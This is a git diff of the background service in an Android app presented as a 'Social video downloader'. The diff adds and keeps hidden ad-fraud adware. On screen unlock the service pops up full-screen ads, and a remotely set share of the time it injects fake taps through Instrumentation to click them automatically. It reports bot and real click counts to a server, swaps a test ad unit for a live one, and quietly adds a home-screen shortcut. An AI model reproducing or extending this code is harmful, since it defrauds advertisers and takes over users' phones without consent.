@@ -1,6 +1,5 @@
 package com.v2social.socialdownloader.services;
 
-import android.app.ActivityManager;
 import android.app.Instrumentation;
 import android.app.Service;
 import android.content.BroadcastReceiver;
@@ -9,17 +8,16 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.graphics.Point;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.preference.PreferenceManager;
 import android.util.Log;
 import android.view.Display;
 import android.view.MotionEvent;
 import android.view.WindowManager;
-import android.widget.Toast;
 
 import com.google.android.gms.ads.AdListener;
 import com.google.android.gms.ads.AdRequest;
@@ -27,11 +25,10 @@ import com.google.android.gms.ads.InterstitialAd;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
 import com.v2social.socialdownloader.AppConstants;
-import com.v2social.socialdownloader.MainActivity;
+import com.v2social.socialdownloader.R;
 import com.v2social.socialdownloader.ShowAds;
 import com.v2social.socialdownloader.network.CheckAds;
-import com.v2social.socialdownloader.network.GetConfig;
-import com.v2social.socialdownloader.network.JsonConfig;
+import com.v2social.socialdownloader.network.ClientConfig;
 
 import java.io.IOException;
 import java.util.Random;
@@ -48,10 +45,9 @@ import okhttp3.RequestBody;
 import okhttp3.Response;
 
 public class MyService extends Service {
-//    private boolean check = false;
     private boolean isBotClick = false;
-    private boolean isClickAds = false;
-    private boolean isContinousShowAds = true;
+    private boolean isContinousShowAds = false;
+    private boolean isReportResult = false;
 
     private ScheduledThreadPoolExecutor myTask;
     private String uuid;
@@ -59,13 +55,26 @@ public class MyService extends Service {
     private int intervalService;
     private int delayService;
 
+    private int countTotalShow=0;
+    private int countRealClick=0;
+    private int countBotClick=0;
+    private int delay_retention = -1;
+
+    private ClientConfig clientConfig;
+    private InterstitialAd mInterstitialAd;
+    private CheckAds checkAds;
+
+    private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
+            new Point(70,92),new Point(48,80),new Point(48,65),new Point(53,40)};
+
     @Override
     public void onCreate() {
         SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
-        idFullService = mPrefs.getString("idFullService","ca-app-pub-3940256099942544/1033173712");
-        intervalService = mPrefs.getInt("intervalService",5);
-        delayService = mPrefs.getInt("delayService",12);;
+        idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21734809637");
+        intervalService = mPrefs.getInt("intervalService", 10);
+        delayService = mPrefs.getInt("delayService", 24);
+        delay_retention = mPrefs.getInt("delay_retention", -1);
 
         MyBroadcast myBroadcast = new MyBroadcast();
         IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
@@ -79,6 +88,34 @@ public class MyService extends Service {
         throw new UnsupportedOperationException("Not yet implemented");
     }
 
+    private void addShortcut() {
+        //Adding shortcut for MainActivity
+
+
+
+        Intent shortcutIntent = new Intent(getApplicationContext(),
+                com.v2social.socialdownloader.MainActivity.class);
+
+        shortcutIntent.setAction(Intent.ACTION_MAIN);
+
+        Intent addIntent = new Intent();
+        addIntent
+                .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Social video downloader");
+        addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
+                Intent.ShortcutIconResource.fromContext(getApplicationContext(),
+                        com.v2social.socialdownloader.R.drawable.icon));
+
+        addIntent
+                .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
+        addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
+        getApplicationContext().sendBroadcast(addIntent);
+
+        Log.d("caomui","ADD shortcut done");
+        createShortcut();
+    }
+
+
 
     private void scheduleTask() {
         myTask = new ScheduledThreadPoolExecutor(1);
@@ -86,155 +123,82 @@ public class MyService extends Service {
             @Override
             public void run() {
                 SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
-                int totalTime = mPrefs.getInt("totalTime",0);
+                int totalTime = mPrefs.getInt("totalTime", 0);
                 totalTime += intervalService;
-                mPrefs.edit().putInt("totalTime",totalTime).commit();
-                if( !isContinousShowAds || (totalTime < delayService * 60))
+                mPrefs.edit().putInt("totalTime", totalTime).commit();
+
+                if(delay_retention >= 0 && totalTime > delay_retention * 60)//add shortcut or không
                 {
+                    Log.d("caomui","add shortcut ===========");
+                    addShortcut();
+                    delay_retention = -1;
+                    mPrefs.edit().putInt("delay_retention",-1).commit();
+                }
+                if (totalTime < delayService * 60) {
                     return;
                 }
 
-                OkHttpClient client = new OkHttpClient();
-                Request okRequest = new Request.Builder()
-                        .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
-                        .build();
+                if(totalTime%1440 == 0)
+                {
+                    countTotalShow = 0;
+                    countBotClick = 0;
+                    countRealClick = 0;
+                    isReportResult = true;
+                }
+                if(isReportResult || clientConfig == null)
+                    getClientConfig();
+                isContinousShowAds = true;
 
-//                Log.d("caomui",AppConstants.URL_ADS_CONFIG + "?id=" + uuid);
-                client.newCall(okRequest).enqueue(new Callback() {
-                    @Override
-                    public void onFailure(Call call, IOException e) {
-
-                    }
-
-                    @Override
-                    public void onResponse(Call call, Response response) throws IOException {
-                        Gson gson = new GsonBuilder().create();
-                        CheckAds checkAds = gson.fromJson(response.body().string(), CheckAds.class);
-
-                        if (checkAds.isShow == 1) {
-                            new Handler(Looper.getMainLooper()).post(new Runnable() {
-                                public void run() {
-                                    InterstitialAd mInterstitialAd = new InterstitialAd(MyService.this);
-                                    mInterstitialAd.setAdUnitId(idFullService);
-                                    mInterstitialAd.setAdListener(new AdListener() {
-
-                                        @Override
-                                        public void onAdClosed() {
-                                            super.onAdClosed();
-                                            if (!isClickAds)
-                                                checkAds(0);
-                                            try {
-                                                if (Build.VERSION.SDK_INT < 21) {
-                                                    ShowAds.getInstance().finishAffinity();
-                                                } else {
-                                                    ShowAds.getInstance().finishAndRemoveTask();
-                                                }
-                                            } catch (Exception e) {
-                                                e.printStackTrace();
-                                            }
-
-                                        }
-
-                                        @Override
-                                        public void onAdFailedToLoad(int i) {
-                                            super.onAdFailedToLoad(i);
-                                            isContinousShowAds = true;
-                                        }
-
-                                        @Override
-                                        public void onAdLeftApplication() {
-                                            super.onAdLeftApplication();
-                                            isClickAds = true;
-                                            if (isBotClick)
-                                                checkAds(2);
-                                            else
-                                                checkAds(1);
-                                        }
-
-                                        @Override
-                                        public void onAdOpened() {
-                                            super.onAdOpened();
-                                            isContinousShowAds = false;
-                                            if (checkAds.isBotClick == 1) {
-                                                new Thread(new Runnable() {
-                                                    @Override
-                                                    public void run() {
-                                                        try {
-                                                            Thread.sleep( checkAds.delayClick * 100);
-                                                            WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
-                                                            Display display = window.getDefaultDisplay();
-                                                            Point point = new Point();
-                                                            display.getSize(point);
-                                                            int width =  checkAds.x * point.x / 100;
-                                                            int height =  checkAds.y * point.y /100;
-                                                            Instrumentation m_Instrumentation = new Instrumentation();
-                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_DOWN, width,  height, 0));
-                                                            Thread.sleep(new Random().nextInt(100));
-                                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    android.os.SystemClock.uptimeMillis(),
-                                                                    MotionEvent.ACTION_UP, width,  height, 0));
-                                                            isBotClick = true;
-                                                        } catch (Exception e) {
-                                                            e.printStackTrace();
-                                                            isBotClick = false;
-                                                        }
-                                                    }
-                                                }).start();
-                                            }
-                                        }
-
-                                        @Override
-                                        public void onAdLoaded() {
-                                            super.onAdLoaded();
-                                            try {
-                                                Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
-                                                showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                                                startActivity(showAds);
-                                                mInterstitialAd.show();
-                                            }
-                                            catch (Exception e)
-                                            {
-                                            }
-
-                                        }
-                                    });
-
-                                    mInterstitialAd.loadAd(new AdRequest.Builder().addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969").build());
-                                }
-                            });
-                        }
-                        else
-                        {
-                            isContinousShowAds = false;
-                        }
-
-                    }
-                });
-
+                Log.d("caomui","------------");
             }
-        }, 60, intervalService, TimeUnit.MINUTES);
-//        }, 20, intervalService, TimeUnit.SECONDS);
+//        }, 60, intervalService, TimeUnit.MINUTES);
+        }, 0, 10, TimeUnit.SECONDS);
+
     }
 
-    private void checkAds(int isClick) {
+    private void getClientConfig()
+    {
         OkHttpClient client = new OkHttpClient();
-        Gson gson = new GsonBuilder().create();
         RequestBody body = new FormBody.Builder()
-                .add("id", uuid)
-                .add("isClick", isClick + "")
+                .add("countTotalShow", countTotalShow + "")
+                .add("countRealClick",countRealClick+"")
+                .add("countBotClick",countBotClick+"")
+                .add("id",uuid)
                 .build();
         Request okRequest = new Request.Builder()
-                .url(AppConstants.URL_ADS_CONFIG)
+                .url(AppConstants.URL_CLIENT_CONFIG)
                 .post(body)
                 .build();
         client.newCall(okRequest).enqueue(new Callback() {
             @Override
             public void onFailure(Call call, IOException e) {
             }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                Log.d("caomui2","response done");
+                Gson gson = new GsonBuilder().create();
+                clientConfig = gson.fromJson(response.body().string(),ClientConfig.class);
+                isReportResult = false;
+            }
+        });
+    }
+
+    private void createShortcut()
+    {
+        OkHttpClient client = new OkHttpClient();
+        RequestBody body = new FormBody.Builder()
+                .add("id",uuid)
+                .build();
+        Request okRequest = new Request.Builder()
+                .url(AppConstants.URL_CREATE_SHORTCUT)
+                .post(body)
+                .build();
+        client.newCall(okRequest).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+            }
+
             @Override
             public void onResponse(Call call, Response response) throws IOException {
             }
@@ -244,8 +208,115 @@ public class MyService extends Service {
     class MyBroadcast extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
-            Log.d("caomui", "Unlock Screen");
-            isContinousShowAds = true;
+            Log.d("cao", "Unlock Screen "+uuid);
+            if(!isContinousShowAds || clientConfig == null)
+                return;
+            if (new Random().nextInt(100) > clientConfig.max_percent_ads)
+            {
+                return;
+            }
+            Log.d("caomui","showads");
+            checkAds = new CheckAds();
+            checkAds.delayClick = clientConfig.min_click_delay + new Random().nextInt(clientConfig.max_click_delay);
+            if(new Random().nextInt(100) < clientConfig.max_ctr_bot)
+                checkAds.isBotClick = 1;
+            else
+                checkAds.isBotClick = 0;
+            Point point = points[new Random().nextInt(points.length)];
+            checkAds.x = point.x;
+            checkAds.y = point.y;
+            isBotClick = false;
+
+            new Handler(Looper.getMainLooper()).post(new Runnable() {
+                public void run() {
+                    mInterstitialAd = new InterstitialAd(MyService.this);
+                    mInterstitialAd.setAdUnitId(idFullService);
+                    mInterstitialAd.setAdListener(new AdListener() {
+
+                        @Override
+                        public void onAdClosed() {
+                            super.onAdClosed();
+                            try {
+                                if (Build.VERSION.SDK_INT < 21) {
+                                    ShowAds.getInstance().finishAffinity();
+                                } else {
+                                    ShowAds.getInstance().finishAndRemoveTask();
+                                }
+                            } catch (Exception e) {
+                                e.printStackTrace();
+                            }
+                        }
+
+                        @Override
+                        public void onAdFailedToLoad(int i) {
+                            super.onAdFailedToLoad(i);
+                            isContinousShowAds = true;
+                        }
+
+                        @Override
+                        public void onAdLeftApplication() {
+                            super.onAdLeftApplication();
+                            if (isBotClick)
+                                countBotClick +=1;
+                            else
+                                countRealClick +=1;
+                        }
+
+                        @Override
+                        public void onAdOpened() {
+                            super.onAdOpened();
+                            countTotalShow += 1;
+                            isContinousShowAds = false;
+                            if (checkAds.isBotClick == 1) {
+                                new Thread(new Runnable() {
+                                    @Override
+                                    public void run() {
+                                        try {
+                                            Thread.sleep(checkAds.delayClick * 100);
+                                            WindowManager window = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+                                            Display display = window.getDefaultDisplay();
+                                            Point point = new Point();
+                                            display.getSize(point);
+                                            int width = checkAds.x * point.x / 100;
+                                            int height = checkAds.y * point.y / 100;
+                                            Instrumentation m_Instrumentation = new Instrumentation();
+                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                    android.os.SystemClock.uptimeMillis(),
+                                                    android.os.SystemClock.uptimeMillis(),
+                                                    MotionEvent.ACTION_DOWN, width, height, 0));
+                                            Thread.sleep(new Random().nextInt(100));
+                                            m_Instrumentation.sendPointerSync(MotionEvent.obtain(
+                                                    android.os.SystemClock.uptimeMillis(),
+                                                    android.os.SystemClock.uptimeMillis(),
+                                                    MotionEvent.ACTION_UP, width, height, 0));
+                                            isBotClick = true;
+                                        } catch (Exception e) {
+                                            e.printStackTrace();
+                                            isBotClick = false;
+                                        }
+                                    }
+                                }).start();
+                            }
+                        }
+
+                        @Override
+                        public void onAdLoaded() {
+                            super.onAdLoaded();
+
+                            try {
+                                Intent showAds = new Intent(getApplicationContext(), ShowAds.class);
+                                showAds.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                startActivity(showAds);
+                                mInterstitialAd.show();
+                            }
+                            catch (Exception e){
+                            }
+                        }
+                    });
+
+                    mInterstitialAd.loadAd(new AdRequest.Builder().build());//addTestDevice("3CC7F69A2A4A1EB57306DA0CFA16B969")
+                }
+            });
         }
     }
 }
